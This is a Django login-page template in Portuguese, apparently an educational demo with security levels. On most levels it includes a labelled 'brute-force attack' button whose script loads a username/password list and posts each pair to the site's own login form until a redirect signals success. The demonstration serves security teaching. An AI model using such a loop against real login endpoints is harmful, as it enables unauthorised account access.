{% load static %}
<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <title>Login Nível {{ level }}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap"
      rel="stylesheet"
    />

    <link
      rel="stylesheet"
      type="text/css"
      href="{% static 'css/header_styles.css' %}"
    />
    <link
      rel="stylesheet"
      type="text/css"
      href="{% static 'css/login_styles.css' %}"
    />
  </head>
  <body class="offset-header">
    {% include "header.html" %}

    <div class="main-wrapper">
      <div class="container">
        <div class="left-pane">
          <div class="video-background">
            <iframe
              src="https://www.youtube-nocookie.com/embed/hUMhJ0m5fEs?autoplay=1&mute=1&loop=1&playlist=hUMhJ0m5fEs&controls=0&showinfo=0&modestbranding=1&fs=0&vq=hd1080"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
              referrerpolicy="strict-origin-when-cross-origin"
            ></iframe>
          </div>
          <div class="left-content">
            <img
              src="{% static 'assets/loqed.webp' %}"
              alt="Logo Loqed Systems"
              class="logo"
            />
          </div>
        </div>

        <div class="right-pane">
          <h1>Login Nível {{ level }}</h1>

          {% if messages %}
          <ul class="messages">
            {% for message in messages %}
            <li class="{{ message.tags }}">{{ message }}</li>
            {% endfor %}
          </ul>
          {% endif %}

          <form method="post" class="login-form" id="loginForm">
            {% csrf_token %}
            <label for="username">Usuário:</label>
            <input type="text" id="username" name="username" required />

            <label for="password">Senha:</label>
            <input type="password" id="password" name="password" required />

            <button type="submit" id="loginButton">Entrar</button>

            <div class="social-login"></div>
          </form>

          {% if level != 3 %}
          <button id="bruteForceBtn" class="brute-force-btn">
            Iniciar Ataque de Força Bruta
          </button>
          <div
            id="bruteForceStatus"
            style="
              margin-top: 15px;
              font-size: 0.9em;
              color: #cc0000;
              font-weight: bold;
            "
          ></div>
          {% endif %}
        </div>
      </div>
    </div>

    {% if level != 3 %}
    <script>
      document.addEventListener("DOMContentLoaded", () => {
        const bruteForceBtn = document.getElementById("bruteForceBtn");
        const statusDiv = document.getElementById("bruteForceStatus");
        const usernameInput = document.getElementById("username");
        const passwordInput = document.getElementById("password");
        const csrfToken = document.querySelector(
          "[name=csrfmiddlewaretoken]"
        ).value;
        const form = document.getElementById("loginForm");

        if (bruteForceBtn) {
          bruteForceBtn.addEventListener("click", async () => {
            bruteForceBtn.disabled = true;
            statusDiv.innerHTML = "Carregando lista de senhas...";

            try {
              // 1. Carregar o payload JSON
              const response = await fetch(
                '{% static "data/bruteforce_payload.json" %}'
              );
              if (!response.ok)
                throw new Error("Falha ao carregar o payload JSON.");

              const payload = await response.json();

              statusDiv.innerHTML = `Iniciando ataque contra {{ level }} tentativas.`;

              // 2. Iterar sobre o payload
              for (let i = 0; i < payload.length; i++) {
                const attempt = payload[i];

                // Atualiza os campos do formulário para visualização
                usernameInput.value = attempt.username;
                passwordInput.value = attempt.password;

                statusDiv.innerHTML = `Tentativa ${i + 1}/${
                  payload.length
                }: Usuário: ${attempt.username}, Senha: ${
                  attempt.password
                } - Tentando...`;

                // Simular a requisição de login
                const loginResponse = await fetch(form.action, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-CSRFToken": csrfToken,
                  },
                  // Montar os dados do formulário
                  body: new URLSearchParams({
                    username: attempt.username,
                    password: attempt.password,
                    csrfmiddlewaretoken: csrfToken,
                  }),
                });

                // 3. Verificar o resultado
                // Em Django, um login bem-sucedido geralmente redireciona (status 302).
                // Um ataque bem-sucedido é detectado se o redirecionamento for para a dashboard.
                if (loginResponse.redirected) {
                  statusDiv.innerHTML = `<span style="color: green;">SUCESSO!</span> Senha encontrada na tentativa ${
                    i + 1
                  }. Redirecionando...`;
                  // Redirecionar manualmente para a página de sucesso
                  window.location.href = loginResponse.url;
                  return;
                }

                // Pequena pausa para simular o tempo de rede/processamento
                await new Promise((resolve) => setTimeout(resolve, 300));
              }

              statusDiv.innerHTML =
                "Ataque concluído. Senha não encontrada na lista fornecida.";
            } catch (error) {
              console.error(error);
              statusDiv.innerHTML = `<span style="color: red;">ERRO:</span> ${error.message}`;
            } finally {
              bruteForceBtn.disabled = false;
            }
          });
        }
      });
    </script>
    {% endif %}
  </body>
</html>
